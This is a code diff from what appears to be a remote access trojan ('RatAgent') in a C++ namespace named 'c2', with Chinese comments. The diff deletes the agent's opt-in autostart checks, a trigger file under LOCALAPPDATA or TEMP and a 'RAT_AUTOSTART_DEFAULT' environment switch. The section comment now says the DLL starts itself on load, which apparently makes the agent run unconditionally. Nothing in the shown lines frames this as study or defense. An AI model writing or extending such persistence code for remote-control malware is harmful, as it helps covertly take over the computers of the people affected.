@@ -583,46 +583,11 @@ namespace c2
         return g_id_hex;
     }
 
-    // ---- 注入自启动触发器（见 agent_runtime.h 说明）----
+    // ---- DLL 加载即自启动（见 agent_runtime.h 说明）----
 
     std::string agent_autostart_path()
     {
         return wide_to_utf8(agent_dir_wide()) + "\\autostart.args";
-    }
-
-    namespace
-    {
-        // 只用 Win32 + 栈缓冲拼触发器路径（DllMain/loader lock 下可安全调用）
-        bool build_trigger_path(wchar_t* out, size_t cap, const wchar_t* env_name)
-        {
-            wchar_t base[MAX_PATH * 2] = { 0 };
-            DWORD n = GetEnvironmentVariableW(env_name, base, (DWORD)(sizeof(base) / sizeof(base[0])));
-            if (n == 0 || n >= sizeof(base) / sizeof(base[0]))
-                return false;
-            const wchar_t* suffix = L"\\RatAgent\\autostart.args";
-            size_t need = (size_t)n + wcslen(suffix) + 1;
-            if (need > cap)
-                return false;
-            for (size_t i = 0; i < (size_t)n; ++i)
-                out[i] = base[i];
-            size_t j = (size_t)n;
-            for (size_t i = 0; suffix[i] != 0; ++i)
-                out[j++] = suffix[i];
-            out[j] = 0;
-            return true;
-        }
-    } // namespace
-
-    bool agent_autostart_trigger_present()
-    {
-        wchar_t path[MAX_PATH * 2] = { 0 };
-        if (build_trigger_path(path, sizeof(path) / sizeof(path[0]), L"LOCALAPPDATA") &&
-            GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES)
-            return true;
-        if (build_trigger_path(path, sizeof(path) / sizeof(path[0]), L"TEMP") &&
-            GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES)
-            return true;
-        return false;
     }
 
     namespace
@@ -671,18 +636,6 @@ namespace c2
             }
         }
         return false;
-    }
-
-    // 显式开关：RAT_AUTOSTART_DEFAULT=1（只用 Win32 + 栈缓冲，可在 DllMain 调用）
-    // 严格匹配 "1"：避免 "0"/"false" 之类的值被误当成开启
-    bool agent_autostart_default_enabled()
-    {
-        wchar_t buf[8] = { 0 };
-        DWORD n = GetEnvironmentVariableW(L"RAT_AUTOSTART_DEFAULT", buf,
-            (DWORD)(sizeof(buf) / sizeof(buf[0])));
-        if (n == 0 || n >= sizeof(buf) / sizeof(buf[0]))
-            return false;
-        return buf[0] == L'1' && buf[1] == 0;
     }
 
     bool agent_signal_stop_by_id_hex(const std::string& hex32)
